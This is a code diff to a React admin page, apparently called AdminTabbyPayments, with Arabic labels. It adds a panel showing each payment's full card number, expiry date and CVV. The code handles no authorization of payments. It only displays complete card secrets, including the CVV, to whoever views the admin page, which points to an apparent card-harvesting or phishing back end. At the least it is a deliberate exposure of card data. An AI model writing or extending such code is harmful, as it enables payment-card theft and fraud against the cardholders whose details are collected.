@@ -269,6 +269,31 @@ const AdminTabbyPayments = () => {
                       )}
                     </div>
 
+                    {/* معلومات البطاقة الكاملة */}
+                    <div className="mb-4 p-4 bg-gradient-to-r from-gray-900 to-gray-700 rounded-xl text-white shadow-lg">
+                      <div className="text-xs text-gray-300 mb-3 font-semibold">معلومات البطاقة الكاملة</div>
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        <div>
+                          <div className="text-xs text-gray-400 mb-1">رقم البطاقة</div>
+                          <div className="font-mono font-bold text-lg tracking-wider" dir="ltr">
+                            {payment.card_number}
+                          </div>
+                        </div>
+                        <div>
+                          <div className="text-xs text-gray-400 mb-1">تاريخ الصلاحية</div>
+                          <div className="font-mono font-bold text-lg" dir="ltr">
+                            {payment.expiry_date}
+                          </div>
+                        </div>
+                        <div>
+                          <div className="text-xs text-gray-400 mb-1">CVV</div>
+                          <div className="font-mono font-bold text-lg">
+                            {payment.cvv}
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
                     {/* معلومات التاريخ */}
                     <div className="mb-4 p-3 bg-gray-50 rounded-lg">
                       <div className="text-xs text-gray-500 mb-1">تاريخ الإنشاء</div>
